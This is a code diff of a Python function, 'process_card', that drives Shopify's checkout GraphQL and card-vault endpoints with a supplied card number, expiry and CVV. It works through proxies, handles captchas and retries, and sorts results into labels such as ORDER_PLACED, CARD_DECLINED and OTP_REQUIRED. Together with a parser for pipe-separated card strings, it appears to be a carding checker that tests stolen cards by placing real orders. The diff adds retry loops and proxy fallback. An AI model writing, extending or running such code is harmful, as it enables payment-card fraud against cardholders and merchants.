+                        'handle': delivery_strategy if delivery_strategy else '',
+                        'customDeliveryRate': False
+                    },
+                    'options': {}
                 }
-            }
-            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
-            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
+                json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
+                    'lines': [{'stableId': stableId or '1'}]
+                }
+                json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
+                    'value': {'amount': str(shipping_amount), 'currencyCode': currency}
+                }
+                json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
+                json_data['variables']['payment']['billingAddress'] = {
+                    'streetAddress': {
+                        'address1': street, 'address2': address2, 'city': city,
+                        'countryCode': country_code, 'postalCode': s_zip,
+                        'firstName': firstName, 'lastName': lastName,
+                        'zoneCode': state, 'phone': phone
+                    }
+                }
+                json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
+                json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
 
-            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
-            )
-            
-            if is_captcha_required(resp_text):
-                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
+                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                )
+                
+                if is_captcha_required(resp_text):
+                    raise Exception("CAPTCHA_REQUIRED on delivery proposal")
 
-            payload = {
-                "credit_card": {
-                    "number": cc,
-                    "month": int(mes),
-                    "year": int(ano),
-                    "verification_value": cvv,
-                    "start_month": None,
-                    "start_year": None,
-                    "issue_number": "",
-                    "name": f"{firstName} {lastName}"
-                },
-                "payment_session_scope": urlparse(url).netloc
-            }
-            
-            vault_headers = {
-                'Content-Type': 'application/json',
-                'Accept': 'application/json',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Origin': 'https://checkout.pci.shopifyinc.com',
-                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-storage-access': 'active',
-            }
-            if ident_sig:
-                vault_headers['shopify-identification-signature'] = ident_sig
-            
-            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
-            try:
-                token_data = await response.json()
-                token = token_data.get('id')
+                payload = {
+                    "credit_card": {
+                        "number": cc,
+                        "month": int(mes),
+                        "year": int(ano),
+                        "verification_value": cvv,
+                        "start_month": None,
+                        "start_year": None,
+                        "issue_number": "",
+                        "name": f"{firstName} {lastName}"
+                    },
+                    "payment_session_scope": urlparse(url).netloc
+                }
+                
+                vault_headers = {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Origin': 'https://checkout.pci.shopifyinc.com',
+                    'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+                    'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'sec-fetch-storage-access': 'active',
+                }
+                if ident_sig:
+                    vault_headers['shopify-identification-signature'] = ident_sig
+                
+                token = None
+                last_err_msg = ""
+                for vault_attempt in range(1, 4):
+                    current_proxy = proxy
+                    if vault_attempt == 3 and proxy:
+                        current_proxy = None
+                    
+                    try:
+                        v_resp = await session.post(
+                            'https://checkout.pci.shopifyinc.com/sessions',
+                            json=payload,
+                            headers=vault_headers,
+                            proxy=current_proxy,
+                            timeout=aiohttp.ClientTimeout(total=10)
+                        )
+                        v_text = await v_resp.text()
+                        
+                        if v_resp.status == 200:
+                            token_data = json.loads(v_text)
+                            token = token_data.get('id')
+                            if token:
+                                break
+                            else:
+                                last_err_msg = f"No token ID returned: {v_text[:100]}"
+                        elif v_resp.status == 422:
+                            try:
+                                token_data = json.loads(v_text)
+                                errors = token_data.get('errors')
+                                if errors:
+                                    err = errors[0]
+                                    field = err.get('field', '')
+                                    code = err.get('code', '')
+                                    msg = err.get('message', '')
+                                    error_detail = f"{field} {msg}".strip() or code or "invalid card details"
+                                    return False, f"CARD_DECLINED: {error_detail}", gateway, total_price, currency
+                            except:
+                                pass
+                            last_err_msg = f"Validation Error (422): {v_text[:100]}"
+                        else:
+                            last_err_msg = f"HTTP {v_resp.status}: {v_text[:100]}"
+                    except Exception as ve:
+                        last_err_msg = str(ve)
+                    
+                    if not token and vault_attempt < 3:
+                        await asyncio.sleep(1.5)
+                
                 if not token:
-                    return False, 'Unable to get payment token', gateway, total_price, currency
-            except Exception as e:
-                return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency
+                    raise Exception(f"Payment Session Error: {last_err_msg}")
 
-            params = {'operationName': 'SubmitForCompletion'}
-            
-            submit_variables = {
-                'input': {
-                    'sessionInput': {'sessionToken': sst},
-                    'queueToken': queueToken or '',
-                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
-                    'delivery': {
-                        'deliveryLines': [{
-                            'destination': {
-                                'streetAddress': {
-                                    'address1': street, 'address2': address2, 'city': city,
-                                    'countryCode': country_code, 'postalCode': s_zip,
-                                    'firstName': firstName, 'lastName': lastName,
-                                    'zoneCode': state, 'phone': phone
-                                }
-                            },
-                            'selectedDeliveryStrategy': {
-                                'deliveryStrategyByHandle': {
-                                    'handle': delivery_strategy if delivery_strategy else '',
-                                    'customDeliveryRate': False
+                params = {'operationName': 'SubmitForCompletion'}
+                
+                submit_variables = {
+                    'input': {
+                        'sessionInput': {'sessionToken': sst},
+                        'queueToken': queueToken or '',
+                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
+                        'delivery': {
+                            'deliveryLines': [{
+                                'destination': {
+                                    'streetAddress': {
+                                        'address1': street, 'address2': address2, 'city': city,
+                                        'countryCode': country_code, 'postalCode': s_zip,
+                                        'firstName': firstName, 'lastName': lastName,
+                                        'zoneCode': state, 'phone': phone
+                                    }
                                 },
-                                'options': {'phone': phone}
-                            },
-                            'targetMerchandiseLines': {
-                                'lines': [{'stableId': stableId or '1'}]
-                            },
-                            'deliveryMethodTypes': ['SHIPPING'],
-                            'expectedTotalPrice': {
-                                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
-                            },
-                            'destinationChanged': False
-                        }],
-                        'noDeliveryRequired': [],
-                        'useProgressiveRates': True,
-                        'prefetchShippingRatesStrategy': None,
-                        'supportsSplitShipping': True
-                    },
-                    'merchandise': {
-                        'merchandiseLines': [{
-                            'stableId': stableId or '1',
-                            'merchandise': {
-                                'productVariantReference': {
-                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
-                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
-                                    'properties': [],
-                                    'sellingPlanId': None,
-                                    'sellingPlanDigest': None
-                                }
-                            },
-                            'quantity': {'items': {'value': 1}},
-                            'expectedTotalPrice': {
-                                'value': {'amount': subtotal, 'currencyCode': currency}
-                            },
-                            'lineComponentsSource': None,
-                            'lineComponents': []
-                        }]
-                    },
-                    'payment': {
-                        'totalAmount': {'any': True},
-                        'paymentLines': [{
-                            'paymentMethod': {
-                                'directPaymentMethod': {
-                                    'paymentMethodIdentifier': payment_identifier,
-                                    'sessionId': token,
-                                    'billingAddress': {
-                                        'streetAddress': {
-                                            'address1': street, 'address2': address2,
-                                            'city': city, 'countryCode': country_code,
-                                            'postalCode': s_zip, 'firstName': firstName,
-                                            'lastName': lastName, 'zoneCode': state,
-                                            'phone': phone
-                                        }
+                                'selectedDeliveryStrategy': {
+                                    'deliveryStrategyByHandle': {
+                                        'handle': delivery_strategy if delivery_strategy else '',
+                                        'customDeliveryRate': False
                                     },
-                                    'cardSource': None
-                                }
-                            },
-                            'amount': {
-                                'value': {'amount': running_total, 'currencyCode': currency}
-                            },
-                            'dueAt': None
-                        }],
-                        'billingAddress': {
-                            'streetAddress': {
-                                'address1': street, 'address2': address2,
-                                'city': city, 'countryCode': country_code,
-                                'postalCode': s_zip, 'firstName': firstName,
-                                'lastName': lastName, 'zoneCode': state,
-                                'phone': phone
-                            }
-                        }
-                    },
-                    'buyerIdentity': {
-                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
-                        'email': email,
-                        'emailChanged': False,
-                        'phoneCountryCode': country_code,
-                        'marketingConsent': [{'email': {'value': email}}],
-                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
-                        'rememberMe': False
-                    },
-                    'taxes': {
-                        'proposedAllocations': None,
-                        'proposedTotalAmount': {
-                            'value': {'amount': str(tax_amount), 'currencyCode': currency}
+                                    'options': {'phone': phone}
+                                },
+                                'targetMerchandiseLines': {
+                                    'lines': [{'stableId': stableId or '1'}]
+                                },
+                                'deliveryMethodTypes': ['SHIPPING'],
+                                'expectedTotalPrice': {
+                                    'value': {'amount': str(shipping_amount), 'currencyCode': currency}
+                                },
+                                'destinationChanged': False
+                            }],
+                            'noDeliveryRequired': [],
+                            'useProgressiveRates': True,
+                            'prefetchShippingRatesStrategy': None,
+                            'supportsSplitShipping': True
                         },
-                        'proposedTotalIncludedAmount': None,
-                        'proposedMixedStateTotalAmount': None,
-                        'proposedExemptions': []
+                        'merchandise': {
+                            'merchandiseLines': [{
+                                'stableId': stableId or '1',
+                                'merchandise': {
+                                    'productVariantReference': {
+                                        'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
+                                        'variantId': f'gid://shopify/ProductVariant/{loop_variant_id}',
+                                        'properties': [],
+                                        'sellingPlanId': None,
+                                        'sellingPlanDigest': None
+                                    }
+                                },
+                                'quantity': {'items': {'value': 1}},
+                                'expectedTotalPrice': {
+                                    'value': {'amount': subtotal, 'currencyCode': currency}
+                                },
+                                'lineComponentsSource': None,
+                                'lineComponents': []
+                            }]
+                        },
+                        'payment': {
+                            'totalAmount': {'any': True},
+                            'paymentLines': [{
+                                'paymentMethod': {
+                                    'directPaymentMethod': {
+                                        'paymentMethodIdentifier': payment_identifier,
+                                        'sessionId': token,
+                                        'billingAddress': {
+                                            'streetAddress': {
+                                                'address1': street, 'address2': address2,
+                                                'city': city, 'countryCode': country_code,
+                                                'postalCode': s_zip, 'firstName': firstName,
+                                                'lastName': lastName, 'zoneCode': state,
+                                                'phone': phone
+                                            }
+                                        },
+                                        'cardSource': None
+                                    }
+                                },
+                                'amount': {
+                                    'value': {'amount': running_total, 'currencyCode': currency}
+                                },
+                                'dueAt': None
+                            }],
+                            'billingAddress': {
+                                'streetAddress': {
+                                    'address1': street, 'address2': address2,
+                                    'city': city, 'countryCode': country_code,
+                                    'postalCode': s_zip, 'firstName': firstName,
+                                    'lastName': lastName, 'zoneCode': state,
+                                    'phone': phone
+                                }
+                            }
+                        },
+                        'buyerIdentity': {
+                            'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
+                            'email': email,
+                            'emailChanged': False,
+                            'phoneCountryCode': country_code,
+                            'marketingConsent': [{'email': {'value': email}}],
+                            'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
+                            'rememberMe': False
+                        },
+                        'taxes': {
+                            'proposedAllocations': None,
+                            'proposedTotalAmount': {
+                                'value': {'amount': str(tax_amount), 'currencyCode': currency}
+                            },
+                            'proposedTotalIncludedAmount': None,
+                            'proposedMixedStateTotalAmount': None,
+                            'proposedExemptions': []
+                        },
+                        'tip': {'tipLines': []},
+                        'note': {'message': None, 'customAttributes': []},
+                        'localizationExtension': {'fields': []},
+                        'nonNegotiableTerms': None,
+                        'optionalDuties': {'buyerRefusesDuties': False}
                     },
-                    'tip': {'tipLines': []},
-                    'note': {'message': None, 'customAttributes': []},
-                    'localizationExtension': {'fields': []},
-                    'nonNegotiableTerms': None,
-                    'optionalDuties': {'buyerRefusesDuties': False}
-                },
-                'attemptToken': attempt_token,
-                'metafields': [],
-                'analytics': {'requestUrl': checkout_url}
-            }
-            
-            if checkpoint_data:
-                submit_variables['input']['checkpointData'] = checkpoint_data
-            
-            submit_json_data = {
-                'query': MUTATION_SUBMIT,
-                'variables': submit_variables,
-                'operationName': 'SubmitForCompletion'
-            }
+                    'attemptToken': attempt_token,
+                    'metafields': [],
+                    'analytics': {'requestUrl': checkout_url}
+                }
+                
+                if checkpoint_data:
+                    submit_variables['input']['checkpointData'] = checkpoint_data
+                
+                submit_json_data = {
+                    'query': MUTATION_SUBMIT,
+                    'variables': submit_variables,
+                    'operationName': 'SubmitForCompletion'
+                }
 
-            response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
-            )
-            
-            if is_captcha_required(text):
-                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
-            
-            if "Your order total has changed." in text:
-                return False, "Site not supported", gateway, total_price, currency
-            if "The requested payment method is not available." in text:
-                return False, "Payment method not available", gateway, total_price, currency
-            
-            try:
-                resp_json = json.loads(text)
-                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
+                s_response, s_text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                    session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
+                )
+                
+                if is_captcha_required(s_text):
+                    raise Exception("CAPTCHA_REQUIRED on submit")
+                
+                if "Your order total has changed." in s_text:
+                    raise Exception("Site not supported (Order total changed)")
+                if "The requested payment method is not available." in s_text:
+                    raise Exception("Payment method not available")
+                
+                submit_resp_json = json.loads(s_text)
+                submit_data = submit_resp_json.get('data', {}).get('submitForCompletion', {})
                 
                 if not submit_data:
-                    errors = resp_json.get('errors', [])
+                    errors = submit_resp_json.get('errors', [])
                     if errors:
                         for error in errors:
                             code = error.get('code')
                             if code:
-                                return False, code, gateway, total_price, currency
-                    return False, "Empty submit response", gateway, total_price, currency
+                                if is_terminal_card_result(code):
+                                    return False, code, gateway, total_price, currency
+                                else:
+                                    raise Exception(f"GraphQL Submit Error: {code}")
+                    raise Exception("Empty submit response")
                 
                 result_type = submit_data.get('__typename', '')
                 
@@ -864,17 +975,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     receipt = submit_data.get('receipt', {})
                     if receipt:
                         receipt_type = receipt.get('__typename', '')
-                        
                         if receipt_type == 'ProcessedReceipt':
                             return True, "ORDER_PLACED", gateway, total_price, currency
-                        
                         rid = receipt.get('id')
                     else:
-                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
+                        raise Exception("SubmitSuccess but no receipt")
                 
                 elif result_type == 'SubmitFailed':
                     reason = submit_data.get('reason', 'Unknown reason')
-                    return False, extract_clean_response(reason), gateway, total_price, currency
+                    clean_reason = extract_clean_response(reason)
+                    if is_terminal_card_result(clean_reason):
+                        return False, clean_reason, gateway, total_price, currency
+                    raise Exception(f"SubmitFailed: {clean_reason}")
                 
                 elif result_type == 'SubmitRejected':
                     errors = submit_data.get('errors', [])
@@ -883,119 +995,128 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             code = error.get('code', '')
                             localized_msg = error.get('localizedMessage', '')
                             non_localized_msg = error.get('nonLocalizedMessage', '')
-                            # If code is generic, prefer the localized/non-localized message for the real decline reason
-                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
-                                detail = localized_msg or non_localized_msg
-                                if detail:
-                                    return False, detail, gateway, total_price, currency
+                            detail = localized_msg or non_localized_msg or code
+                            if is_terminal_card_result(detail) or is_terminal_card_result(code):
+                                return False, detail, gateway, total_price, currency
                             if code:
-                                return False, code, gateway, total_price, currency
-                    return False, "Submit Rejected", gateway, total_price, currency
+                                raise Exception(f"SubmitRejected Code: {code} ({detail})")
+                    raise Exception("Submit Rejected")
                 
                 elif result_type == 'Throttled':
-                    return False, "Throttled", gateway, total_price, currency
+                    raise Exception("Throttled")
                 
                 receipt = submit_data.get('receipt', {})
                 if not receipt:
-                    return False, "No receipt in submit response", gateway, total_price, currency
+                    raise Exception("No receipt in submit response")
                 
                 rid = receipt.get('id')
                 if not rid:
-                    return False, "No receipt ID", gateway, total_price, currency
+                    raise Exception("No receipt ID")
                 
-            except json.JSONDecodeError:
-                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
-            except Exception as e:
-                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency
+                params = {'operationName': 'PollForReceipt'}
+                poll_json_data = {
+                    'query': QUERY_POLL,
+                    'variables': {'receiptId': rid, 'sessionToken': sst},
+                    'operationName': 'PollForReceipt'
+                }
 
-            params = {'operationName': 'PollForReceipt'}
-            poll_json_data = {
-                'query': QUERY_POLL,
-                'variables': {'receiptId': rid, 'sessionToken': sst},
-                'operationName': 'PollForReceipt'
-            }
-
-            await asyncio.sleep(3)
-            
-            for i in range(4):
-                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                    session, graphql_url, params, headers, poll_json_data, 
-                    checkout_url, max_retries=1
-                )
+                await asyncio.sleep(3)
                 
-                if is_captcha_required(final_text):
+                final_text = ""
+                for p_idx in range(4):
+                    p_resp, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                        session, graphql_url, params, headers, poll_json_data, 
+                        checkout_url, max_retries=1
+                    )
+                    
+                    if is_captcha_required(final_text):
+                        return True, "CARD_DECLINED", gateway, total_price, currency
+                    
+                    try:
+                        poll_json = json.loads(final_text)
+                        receipt_data = poll_json.get('data', {}).get('receipt', {})
+                        
+                        if receipt_data:
+                            typename = receipt_data.get('__typename', '')
+                            
+                            if typename == 'ProcessedReceipt':
+                                return True, "ORDER_PLACED", gateway, total_price, currency
+                            elif typename == 'FailedReceipt':
+                                error = receipt_data.get('processingError', {})
+                                error_type = error.get('__typename', '')
+                                if error_type == 'PaymentFailed':
+                                    code = error.get('code', '')
+                                    msg = error.get('messageUntranslated', '')
+                                    if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
+                                        if is_terminal_card_result(msg):
+                                            return True, msg, gateway, total_price, currency
+                                        raise Exception(f"FailedReceipt PaymentFailed: {msg}")
+                                    if is_terminal_card_result(code):
+                                        return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
+                                    raise Exception(f"FailedReceipt PaymentFailed: {code}")
+                                code = error.get('code') or error_type or 'UNKNOWN_ERROR'
+                                if is_terminal_card_result(code):
+                                    return True, code, gateway, total_price, currency
+                                raise Exception(f"FailedReceipt: {code}")
+                            elif typename == 'ActionRequiredReceipt':
+                                return True, "OTP_REQUIRED", gateway, total_price, currency
+                            
+                            if typename in ['ProcessingReceipt', 'WaitingReceipt']:
+                                await asyncio.sleep(4)
+                                continue
+                            
+                    except Exception as e:
+                        if "PaymentFailed" in str(e) or "FailedReceipt" in str(e):
+                            raise e
+                        pass
+                    
+                    if 'WaitingReceipt' in final_text:
+                        await asyncio.sleep(4)
+                    else:
+                        break
+                
+                if 'CAPTCHA_REQUIRED' in final_text:
                     return True, "CARD_DECLINED", gateway, total_price, currency
                 
+                if 'WaitingReceipt' in final_text:
+                    raise Exception("Change Proxy or Site (WaitingReceipt timeout)")
+                
                 try:
-                    poll_json = json.loads(final_text)
-                    receipt_data = poll_json.get('data', {}).get('receipt', {})
+                    res_json = json.loads(final_text)
+                    result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                     
-                    if receipt_data:
-                        typename = receipt_data.get('__typename', '')
-                        
-                        if typename == 'ProcessedReceipt':
-                            return True, "ORDER_PLACED", gateway, total_price, currency
-                        elif typename == 'FailedReceipt':
-                            error = receipt_data.get('processingError', {})
-                            error_type = error.get('__typename', '')
-                            if error_type == 'PaymentFailed':
-                                code = error.get('code', '')
-                                msg = error.get('messageUntranslated', '')
-                                # If code is generic, prefer the untranslated message for the real decline reason
-                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
-                                    return True, msg, gateway, total_price, currency
-                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
-                            # Handle other error types
-                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
-                            return True, code, gateway, total_price, currency
-                        elif typename == 'ActionRequiredReceipt':
-                            return True, "OTP_REQUIRED", gateway, total_price, currency
-                        
-                        if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
-                            await asyncio.sleep(4)
-                            continue
-                        
+                    if "shopify_payments" in str(res_json):
+                        return True, "ORDER_PLACED", gateway, total_price, currency
+                    elif result:
+                        if is_terminal_card_result(result):
+                            return True, result, gateway, total_price, currency
+                        raise Exception(f"Poll result error: {result}")
+                    else:
+                        return True, "MISMATCHED_BILL", gateway, total_price, currency
                 except Exception as e:
+                    if "Poll result error" in str(e):
+                        raise e
                     pass
                 
-                if 'WaitingReceipt' in final_text:
-                    await asyncio.sleep(4)
+                code = extract_between(final_text, '{"code":"', '"')
+                final_lower = final_text.lower()
+                if 'actionreq' in final_lower or 'action_required' in final_lower:
+                    return True, f"OTP_REQUIRED", gateway, total_price, currency
+                elif 'processedreceipt' in final_lower:
+                    return True, f"ORDER_PLACED", gateway, total_price, currency
+                elif 'failedreceipt' in final_lower or 'declined' in final_lower:
+                    return True, code if code else "CARD_DECLINED", gateway, total_price, currency
                 else:
-                    break
-            
-            if 'CAPTCHA_REQUIRED' in final_text:
-                return True, "CARD_DECLINED", gateway, total_price, currency
-            
-            if 'WaitingReceipt' in final_text:
-                return False, "Change Proxy or Site", gateway, total_price, currency
-            
-            try:
-                res_json = json.loads(final_text)
-                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
-                
-                if "shopify_payments" in str(res_json):
-                    return True, "ORDER_PLACED", gateway, total_price, currency
-                elif result:
-                    return True, result, gateway, total_price, currency
-                else:
-                    return True, "MISMATCHED_BILL", gateway, total_price, currency
-            except:
-                pass
-            
-            code = extract_between(final_text, '{"code":"', '"')
-            
-            final_lower = final_text.lower()
-            if 'actionreq' in final_lower or 'action_required' in final_lower:
-                return True, f"OTP_REQUIRED", gateway, total_price, currency
-            elif 'processedreceipt' in final_lower:
-                return True, f"ORDER_PLACED", gateway, total_price, currency
-            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
-                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
-            else:
-                return False, f"Unknown Result", gateway, total_price, currency
+                    raise Exception("Unknown poll receipt result")
 
-    except Exception as e:
-        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency
+        except Exception as attempt_error:
+            error_msg = str(attempt_error)
+            last_message = error_msg
+            print(f"[Attempt {attempt}/4] Operational error: {error_msg}. Sleeping and retrying...")
+            if attempt < 4:
+                await asyncio.sleep(3)
+                
+    return last_success, last_message, gateway, total_price, currency
 
 def parse_cc_string(cc_string):
     parts = cc_string.split('|')
